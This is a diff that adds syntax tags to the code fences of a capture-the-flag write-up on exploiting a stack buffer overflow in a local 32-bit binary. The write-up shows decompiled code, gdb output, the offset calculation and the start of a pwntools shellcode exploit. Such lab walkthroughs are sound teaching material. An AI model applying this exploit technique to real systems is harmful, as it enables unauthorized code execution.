@@ -2,7 +2,7 @@
 
 Let's take a look at the binary:
 
-```
+```console
 $	file pwn3 
 pwn3: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 3.2.0, BuildID[sha1]=6ea573b4a0896b428db719747b139e6458d440a0, not stripped
 $	./pwn3 
@@ -12,7 +12,7 @@ Take this, you might need it on your journey 0xffa1c61e!
 
 So we are dealing with a 32 bit binary. When we run it, it prints out what looks like a stack address and prompts us for input. When we take a look at the main function in Ghidra, we see this:
 
-```
+```c
 /* WARNING: Type propagation algorithm not settling */
 
 undefined4 main(void)
@@ -29,7 +29,7 @@ undefined4 main(void)
 
 Looking through the main function, the most important thing here is that it calls the `echo` function. Let's take a look at that function in Ghidra:
 
-```
+```c
 /* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */
 
 void echo(void)
@@ -53,7 +53,7 @@ This also applies to where our shellcode is stored in memory, which we need to k
 
 Let's use gdb to see how much space we have between the start of our input and the return address:
 
-```
+```gdb
 gef➤  disas echo
 Dump of assembler code for function echo:
    0x0000059d <+0>:	push   ebp
@@ -143,14 +143,14 @@ Stack level 0, frame at 0xffffd070:
 
 Just a bit of math:
 
-```
+```pycon
 >>> hex(0xffffd06c - 0xffffcf3e)
 '0x12e'
 ```
 
 So the space between the start of our input and the return address is `0x12e` bytes. This makes sense since the char array which holds our input is `294` bytes large, and there are two saved register values (ebx and ebp) on the stack in between our input and the saved return address each `4` bytes a piece (`294 + 4 + 4 = 0x12e`). With all of this, we have all we need to write the exploit:
 
-```
+```python
 from pwn import *
 
 target = process('./pwn3')
@@ -180,7 +180,7 @@ target.interactive()
 ```
 
 When we run it:
-```
+```console
 $	python exploit.py 
 [+] Starting local process './pwn3': pid 5149
 Take this, you might need it on your journey 
